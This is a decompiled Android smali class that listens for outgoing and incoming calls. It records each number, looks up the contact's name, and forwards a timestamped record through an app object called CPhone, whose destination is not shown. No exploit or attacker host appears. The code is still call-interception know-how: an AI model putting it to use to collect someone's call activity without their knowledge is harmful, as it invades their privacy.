.class public Lcom/example/myphone/VOICE_Receiver;
.super Landroid/content/BroadcastReceiver;
.source "VOICE_Receiver.java"


# static fields
.field private static DEBUG:Z = false

.field private static final TAG:Ljava/lang/String; = "MyPhone"

.field private static incomingFlag:Z

.field private static phonenumber:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 20
    const/4 v0, 0x1

    sput-boolean v0, Lcom/example/myphone/VOICE_Receiver;->DEBUG:Z

    .line 21
    const/4 v0, 0x0

    sput-boolean v0, Lcom/example/myphone/VOICE_Receiver;->incomingFlag:Z

    .line 22
    const/4 v0, 0x0

    sput-object v0, Lcom/example/myphone/VOICE_Receiver;->phonenumber:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public GetPersonName(Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .param p1, "phoneNumber"    # Ljava/lang/String;

    .prologue
    .line 26
    const-string v0, "null"

    return-object v0
.end method

.method public QueryNameFromNumber(Ljava/lang/String;)Ljava/lang/String;
    .locals 8
    .param p1, "num"    # Ljava/lang/String;

    .prologue
    .line 31
    const/4 v6, 0x0

    .line 34
    .local v6, "cursor":Landroid/database/Cursor;
    :try_start_0
    sget-boolean v0, Lcom/example/myphone/VOICE_Receiver;->DEBUG:Z

    if-eqz v0, :cond_0

    .line 35
    const-string v0, "MyPhone"

    const-string v1, "PhoneInfo::QueryNameFromNumber"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 36
    :cond_0
    const/4 v0, 0x2

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "data1"

    aput-object v1, v2, v0

    const/4 v0, 0x1

    const-string v1, "display_name"

    aput-object v1, v2, v0

    .line 37
    .local v2, "projection":[Ljava/lang/String;
    const/4 v0, 0x1

    new-array v4, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    invoke-virtual {p1}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v1

    aput-object v1, v4, v0

    .line 39
    .local v4, "selectionArgs":[Ljava/lang/String;
    sget-object v0, Lcom/example/myphone/MainActivity;->MainThis:Lcom/example/myphone/MainActivity;

    invoke-virtual {v0}, Lcom/example/myphone/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 40
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    .line 41
    const-string v3, " data1 = ?"

    const/4 v5, 0x0

    .line 39
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 42
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 46
    const-string v0, "display_name"

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    .line 45
    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v7

    .line 54
    .end local v2    # "projection":[Ljava/lang/String;
    .end local v4    # "selectionArgs":[Ljava/lang/String;
    :goto_0
    return-object v7

    .line 50
    :catch_0
    move-exception v0

    .line 54
    :cond_1
    const-string v7, "null"

    goto :goto_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 59
    new-instance v4, Ljava/text/SimpleDateFormat;

    const-string v7, "yyyy-MM-dd hh:mm:ss"

    invoke-direct {v4, v7}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 60
    .local v4, "sdf":Ljava/text/SimpleDateFormat;
    new-instance v1, Ljava/util/Date;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    invoke-direct {v1, v8, v9}, Ljava/util/Date;-><init>(J)V

    .line 61
    .local v1, "curDate":Ljava/util/Date;
    invoke-virtual {v4, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v5

    .line 62
    .local v5, "strdate":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 64
    .local v3, "sb":Ljava/lang/StringBuilder;
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v7

    const-string v8, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 66
    const/4 v7, 0x0

    sput-boolean v7, Lcom/example/myphone/VOICE_Receiver;->incomingFlag:Z

    .line 67
    const-string v7, "android.intent.extra.PHONE_NUMBER"

    invoke-virtual {p2, v7}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    sput-object v7, Lcom/example/myphone/VOICE_Receiver;->phonenumber:Ljava/lang/String;

    .line 68
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "+"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 69
    const-string v7, "2+"

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 70
    new-instance v7, Ljava/lang/StringBuilder;

    sget-object v8, Lcom/example/myphone/VOICE_Receiver;->phonenumber:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "+"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 71
    sget-object v7, Lcom/example/myphone/VOICE_Receiver;->phonenumber:Ljava/lang/String;

    invoke-virtual {p0, v7}, Lcom/example/myphone/VOICE_Receiver;->QueryNameFromNumber(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 73
    sget-boolean v7, Lcom/example/myphone/VOICE_Receiver;->DEBUG:Z

    if-eqz v7, :cond_0

    .line 74
    const-string v7, "MyPhone"

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "\u65b0\u53bb\u7535\uff1a"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 75
    :cond_0
    sget-object v7, Lcom/example/myphone/MainActivity;->objPhone:Lcom/example/myphone/CPhone;

    if-eqz v7, :cond_1

    .line 79
    :try_start_0
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const-string v8, "gbk"

    invoke-virtual {v7, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    .line 80
    .local v0, "bArry":[B
    sget-object v7, Lcom/example/myphone/MainActivity;->objPhone:Lcom/example/myphone/CPhone;

    .line 81
    array-length v8, v0

    .line 80
    invoke-virtual {v7, v0, v8}, Lcom/example/myphone/CPhone;->SendNewVoiceMsg([BI)V
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    .line 132
    .end local v0    # "bArry":[B
    :cond_1
    :goto_0
    return-void

    .line 82
    :catch_0
    move-exception v2

    .line 83
    .local v2, "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v2}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    goto :goto_0

    .line 92
    .end local v2    # "e":Ljava/io/UnsupportedEncodingException;
    :cond_2
    const-string v7, "phone"

    .line 91
    invoke-virtual {p1, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/telephony/TelephonyManager;

    .line 94
    .local v6, "tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v6}, Landroid/telephony/TelephonyManager;->getCallState()I

    move-result v7

    packed-switch v7, :pswitch_data_0

    goto :goto_0

    .line 97
    :pswitch_0
    const/4 v7, 0x1

    sput-boolean v7, Lcom/example/myphone/VOICE_Receiver;->incomingFlag:Z

    .line 98
    const-string v7, "incoming_number"

    invoke-virtual {p2, v7}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    sput-object v7, Lcom/example/myphone/VOICE_Receiver;->phonenumber:Ljava/lang/String;

    goto :goto_0

    .line 102
    :pswitch_1
    sget-boolean v7, Lcom/example/myphone/VOICE_Receiver;->incomingFlag:Z

    if-eqz v7, :cond_1

    .line 104
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "+"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 105
    const-string v7, "1+"

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 106
    new-instance v7, Ljava/lang/StringBuilder;

    sget-object v8, Lcom/example/myphone/VOICE_Receiver;->phonenumber:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "+"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 107
    sget-object v7, Lcom/example/myphone/VOICE_Receiver;->phonenumber:Ljava/lang/String;

    invoke-virtual {p0, v7}, Lcom/example/myphone/VOICE_Receiver;->QueryNameFromNumber(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 109
    sget-boolean v7, Lcom/example/myphone/VOICE_Receiver;->DEBUG:Z

    if-eqz v7, :cond_3

    .line 110
    const-string v7, "TAG"

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "\u65b0\u6765\u7535\uff1a"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 111
    :cond_3
    sget-object v7, Lcom/example/myphone/MainActivity;->objPhone:Lcom/example/myphone/CPhone;

    if-eqz v7, :cond_1

    .line 115
    :try_start_1
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const-string v8, "gbk"

    invoke-virtual {v7, v8}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    .line 116
    .restart local v0    # "bArry":[B
    sget-object v7, Lcom/example/myphone/MainActivity;->objPhone:Lcom/example/myphone/CPhone;

    .line 117
    array-length v8, v0

    .line 116
    invoke-virtual {v7, v0, v8}, Lcom/example/myphone/CPhone;->SendNewVoiceMsg([BI)V
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_0

    .line 118
    .end local v0    # "bArry":[B
    :catch_1
    move-exception v2

    .line 119
    .restart local v2    # "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v2}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    goto/16 :goto_0

    .line 94
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method
